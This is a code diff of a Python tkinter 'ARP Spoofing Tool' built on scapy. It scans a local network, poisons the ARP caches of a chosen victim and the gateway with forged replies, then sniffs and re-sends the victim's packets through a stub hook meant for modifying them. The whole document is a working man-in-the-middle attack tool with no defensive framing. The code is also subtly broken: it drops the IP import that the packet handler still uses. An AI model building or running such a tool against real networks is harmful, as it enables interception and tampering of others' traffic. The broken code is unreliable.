@@ -1,125 +1,111 @@
 import os
 import socket
 import psutil
-from scapy.all import ARP, Ether, srp, send, sniff, IP, TCP, UDP, ICMP
+from scapy.all import ARP, Ether, srp, send, sniff
 import tkinter as tk
 from tkinter import ttk
 import threading
-import subprocess
 import platform
+import sys
 
 class ARP_Spoof_GUI:
     def __init__(self, master):
         self.master = master
         master.title("ARP Spoofing Tool")
+        self.create_widgets()
+        self.scan_thread = None
+        self.attack_thread = None
+        self.sniff_thread = None
+        self.stop_attack_flag = threading.Event()
+        self.set_network_interfaces()
 
-        self.frame1 = ttk.Frame(master)
-        self.frame1.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
+    def create_widgets(self):
+        self.create_scan_frame()
+        self.create_devices_frame()
+        self.create_address_frame()
+        self.create_buttons_frame()
+        self.create_packet_text()
 
-        self.label_interface = ttk.Label(self.frame1, text="Network Interface:")
+    def create_scan_frame(self):
+        self.frame_scan = ttk.Frame(self.master)
+        self.frame_scan.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
+        self.label_interface = ttk.Label(self.frame_scan, text="Network Interface:")
         self.label_interface.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
-
-        self.interfaces = ttk.Combobox(self.frame1)
+        self.interfaces = ttk.Combobox(self.frame_scan)
         self.interfaces.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
-
-        self.scan_button = ttk.Button(self.frame1, text="Scan Network", command=self.scan_network)
+        self.scan_button = ttk.Button(self.frame_scan, text="Scan Network", command=self.scan_network)
         self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
 
-        self.frame2 = ttk.Frame(master)
-        self.frame2.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
-
-        self.devices_treeview = ttk.Treeview(self.frame2)
-        self.devices_treeview["columns"] = ("IP Address", "MAC Address")
+    def create_devices_frame(self):
+        self.frame_devices = ttk.Frame(self.master)
+        self.frame_devices.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
+        self.devices_treeview = ttk.Treeview(self.frame_devices, columns=("IP Address", "MAC Address"))
         self.devices_treeview.heading("#0", text="Device")
         self.devices_treeview.heading("IP Address", text="IP Address")
         self.devices_treeview.heading("MAC Address", text="MAC Address")
         self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)
 
-        self.frame3 = ttk.Frame(master)
-        self.frame3.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
-
-        self.label_victim_ip = ttk.Label(self.frame3, text="Victim IP Address:")
+    def create_address_frame(self):
+        self.frame_address = ttk.Frame(self.master)
+        self.frame_address.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
+        self.label_victim_ip = ttk.Label(self.frame_address, text="Victim IP Address:")
         self.label_victim_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
-
-        self.entry_victim_ip = ttk.Entry(self.frame3)
+        self.entry_victim_ip = ttk.Entry(self.frame_address)
         self.entry_victim_ip.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
-
-        self.label_gateway_ip = ttk.Label(self.frame3, text="Gateway IP Address:")
+        self.label_gateway_ip = ttk.Label(self.frame_address, text="Gateway IP Address:")
         self.label_gateway_ip.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
-
-        self.entry_gateway_ip = ttk.Entry(self.frame3)
+        self.entry_gateway_ip = ttk.Entry(self.frame_address)
         self.entry_gateway_ip.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
 
-        self.frame4 = ttk.Frame(master)
-        self.frame4.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)
-
-        self.attack_button = ttk.Button(self.frame4, text="Start Attack", command=self.start_attack)
+    def create_buttons_frame(self):
+        self.frame_buttons = ttk.Frame(self.master)
+        self.frame_buttons.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)
+        self.attack_button = ttk.Button(self.frame_buttons, text="Start Attack", command=self.start_attack)
         self.attack_button.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
-
-        self.stop_button = ttk.Button(self.frame4, text="Stop Attack", command=self.stop_attack)
+        self.stop_button = ttk.Button(self.frame_buttons, text="Stop Attack", command=self.stop_attack)
         self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
         self.stop_button.configure(state=tk.DISABLED)
 
-        self.packet_text = tk.Text(master, height=10, width=70)
+    def create_packet_text(self):
+        self.packet_text = tk.Text(self.master, height=10, width=70)
         self.packet_text.grid(row=4, column=0, padx=10, pady=5, sticky=tk.W+tk.E)
 
-        self.scan_thread = None
-        self.attack_thread = None
-        self.sniff_thread = None
-
-        # Set default network interface
-        self.set_network_interfaces()
-
     def set_network_interfaces(self):
-        try:
-            interfaces = self.get_network_interfaces()
-            if interfaces:
-                interfaces_list = list(interfaces)
-                self.interfaces['values'] = interfaces_list
-                self.interfaces.set(interfaces_list[0])
-        except Exception as e:
-            print(f"Error setting network interfaces: {e}")
+        interfaces = self.get_network_interfaces()
+        if interfaces:
+            self.interfaces['values'] = list(interfaces)
+            self.interfaces.set(list(interfaces)[0])
 
     def get_network_interfaces(self):
         try:
             if platform.system() == 'Windows':
                 interfaces = psutil.net_if_addrs().keys()
             else:
-                interfaces = [interface.name for interface in psutil.net_if_addrs().values()]
+                interfaces = psutil.net_if_addrs().keys()
             return interfaces
         except Exception as e:
             print(f"Error getting network interfaces: {e}")
             return None
 
     def scan_network(self):
-        try:
-            for item in self.devices_treeview.get_children():
-                self.devices_treeview.delete(item)
-
-            selected_network = self.interfaces.get()
-
-            self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
-            self.scan_thread.start()
-        except Exception as e:
-            print(f"Error initiating network scan: {e}")
+        selected_network = self.interfaces.get()
+        self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
+        self.scan_thread.start()
 
     def do_scan_network(self, selected_network):
-        try:
-            ip_range = self.get_ip_range(selected_network)
-            if not ip_range:
-                self.insert_to_treeview("Unable to get IP range for the selected network interface.")
-                return
+        ip_range = self.get_ip_range(selected_network)
+        if not ip_range:
+            self.insert_to_treeview("Unable to get IP range for the selected network interface.")
+            return
 
-            self.insert_to_treeview(f"Scanning network: {ip_range}...")
-            devices = self.scan_with_scapy(ip_range)
+        self.insert_to_treeview(f"Scanning network: {ip_range}...")
+        devices = self.scan_with_scapy(ip_range)
 
-            unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
-            devices = list(unique_devices.values())
+        unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
+        devices = list(unique_devices.values())
 
-            for device in devices:
-                self.insert_to_treeview(device['ip'], device['mac'])
-        except Exception as e:
-            print(f"Error scanning network: {e}")
+        for device in devices:
+            self.insert_to_treeview(device['ip'], device['mac'])
 
     def get_ip_range(self, interface):
         ip_address = self.get_ip_address(interface)
@@ -169,20 +155,18 @@ class ARP_Spoof_GUI:
     def start_attack(self):
         self.attack_button.configure(state=tk.DISABLED)
         self.stop_button.configure(state=tk.NORMAL)
-
+        self.stop_attack_flag.clear()
         gateway_ip = self.entry_gateway_ip.get()
         victim_ip = self.entry_victim_ip.get()
-
         self.attack_thread = threading.Thread(target=self.do_start_attack, args=(gateway_ip, victim_ip))
         self.attack_thread.start()
-
         self.sniff_thread = threading.Thread(target=self.start_sniffing, args=(victim_ip,))
         self.sniff_thread.start()
 
     def do_start_attack(self, gateway_ip, victim_ip):
+        self.attacker_mac = self.get_attacker_mac()
         victim_mac = None
         gateway_mac = None
-
         devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))
 
         for device in devices:
@@ -197,7 +181,7 @@ class ARP_Spoof_GUI:
 
         self.insert_to_treeview(f"Starting ARP spoofing: {victim_ip} ({victim_mac}) -> {gateway_ip} ({gateway_mac})")
         try:
-            while True:
+            while not self.stop_attack_flag.is_set():
                 self.arp_spoof(victim_ip, victim_mac, gateway_ip)
                 self.arp_spoof(gateway_ip, gateway_mac, victim_ip)
         except KeyboardInterrupt:
@@ -208,7 +192,7 @@ class ARP_Spoof_GUI:
             self.stop_button.configure(state=tk.DISABLED)
 
     def arp_spoof(self, target_ip, target_mac, spoof_ip):
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=self.attacker_mac)
         send(packet, verbose=False)
 
     def restore_arp(self, target_ip, target_mac, source_ip, source_mac):
@@ -216,15 +200,55 @@ class ARP_Spoof_GUI:
         send(packet, verbose=False)
 
     def start_sniffing(self, victim_ip):
+        self.victim_mac = None
+        devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))
+        for device in devices:
+            if device['ip'] == victim_ip:
+                self.victim_mac = device['mac']
+                break
+
+        if not self.victim_mac:
+            self.insert_to_treeview("Could not find MAC address of the victim.")
+            return
+
+        self.gateway_mac = None
+        gateway_ip = self.entry_gateway_ip.get()
+        for device in devices:
+            if device['ip'] == gateway_ip:
+                self.gateway_mac = device['mac']
+                break
+
+        if not self.gateway_mac:
+            self.insert_to_treeview("Could not find MAC address of the gateway.")
+            return
+
         sniff(filter=f"host {victim_ip}", prn=self.handle_packet)
 
     def handle_packet(self, packet):
-        self.packet_text.insert(tk.END, f"{packet.summary()}\n")
-        self.packet_text.see(tk.END)
+        if packet.haslayer(IP):
+            if packet.src == self.victim_mac and packet.dst == self.attacker_mac:
+                modified_packet = self.modify_packet(packet)
+                send(modified_packet, verbose=False)
+                self.insert_to_packet_text(f"Forwarded to Gateway: {packet.summary()}\n")
+            elif packet.src == self.gateway_mac and packet.dst == self.attacker_mac:
+                modified_packet = self.modify_packet(packet)
+                send(modified_packet, verbose=False)
+                self.insert_to_packet_text(f"Forwarded to Victim: {packet.summary()}\n")
+
+    def modify_packet(self, packet):
+        return packet
+
+    def get_attacker_mac(self):
+        addrs = psutil.net_if_addrs().get(self.interfaces.get(), [])
+        for addr in addrs:
+            if addr.family == psutil.AF_LINK:
+                return addr.address
+        return None
 
     def stop_attack(self):
         self.attack_button.configure(state=tk.NORMAL)
         self.stop_button.configure(state=tk.DISABLED)
+        self.stop_attack_flag.set()
 
         if self.attack_thread and self.attack_thread.is_alive():
             self.attack_thread.join()
@@ -232,14 +256,18 @@ class ARP_Spoof_GUI:
         if self.sniff_thread and self.sniff_thread.is_alive():
             self.sniff_thread.join()
 
-
 def main():
     try:
         root = tk.Tk()
         gui = ARP_Spoof_GUI(root)
+        root.protocol("WM_DELETE_WINDOW", lambda: on_close(root))
         root.mainloop()
     except Exception as e:
         print(f"GUI Error: {e}")
+
+def on_close(root):
+    root.destroy()
+    sys.exit(0)
 
 if __name__ == "__main__":
     main()
